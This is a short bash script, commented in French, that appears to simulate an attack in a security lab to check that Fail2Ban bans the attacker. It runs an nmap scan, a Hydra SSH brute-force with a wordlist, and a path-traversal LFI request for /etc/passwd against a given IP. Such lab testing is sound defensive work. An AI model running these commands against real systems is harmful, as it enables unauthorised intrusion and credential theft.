#!/usr/bin/env bash
# Simulation d'attaque contre la machine cible du LABORATOIRE (à lancer depuis la VM attaquante).
# ⚠️ Uniquement sur des machines dont vous êtes propriétaire ou que vous êtes autorisé à tester.
# Usage : ./scripts/simulate_attack.sh 10.10.0.10
set -euo pipefail
TARGET="${1:?Usage: $0 <ip_cible_du_lab>}"

echo "[1/4] Reconnaissance ICMP";            ping -c 4 "$TARGET" || true
echo "[2/4] Scan de ports (nmap -sS)";       sudo nmap -sS -T4 --top-ports 100 "$TARGET" || true
echo "[3/4] Brute-force SSH (Hydra)";        hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 "ssh://$TARGET" || true
echo "[4/4] Tentative LFI";                  curl -s -o /dev/null "http://$TARGET/index.php?page=../../../../etc/passwd" || true

echo "Vérification : la connexion doit maintenant être refusée"
nc -zv -w 3 "$TARGET" 22 || echo "=> Source bannie par Fail2Ban"
